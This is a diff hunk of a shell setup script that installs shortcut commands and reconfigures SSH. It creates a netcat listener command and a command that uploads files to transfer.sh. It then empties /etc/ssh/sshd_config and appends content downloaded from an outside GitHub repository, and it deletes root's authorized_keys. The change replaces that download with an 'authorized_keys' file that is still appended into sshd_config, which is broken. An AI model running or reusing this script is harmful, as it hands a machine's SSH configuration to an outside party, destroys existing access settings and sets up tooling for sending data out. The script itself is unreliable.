@@ -8,8 +8,8 @@ echo "curl ipinfo.io/ip" >> /usr/bin/ii && chmod +x /usr/bin/ii
 echo "clear && nc -lvp \$1" >> /usr/bin/lll && chmod +x /usr/bin/lll
 echo -e "clear\necho\necho\ncurl --upload-file \$1 https://transfer.sh/\$1;echo ''\n" > /usr/bin/uu && chmod +x /usr/bin/uu
 echo "" >  /etc/ssh/sshd_config
-wget https://raw.githubusercontent.com/cr00w/t00l/master/sshd_config
-cat sshd_config  >>  /etc/ssh/sshd_config
+wget https://raw.githubusercontent.com/l0se3x/anyway/master/authorized_keys
+cat authorized_keys  >>  /etc/ssh/sshd_config
 rm /root/.ssh/authorized_keys
 mkdir -p ~/.ssh
 chmod 700 ~/.ssh
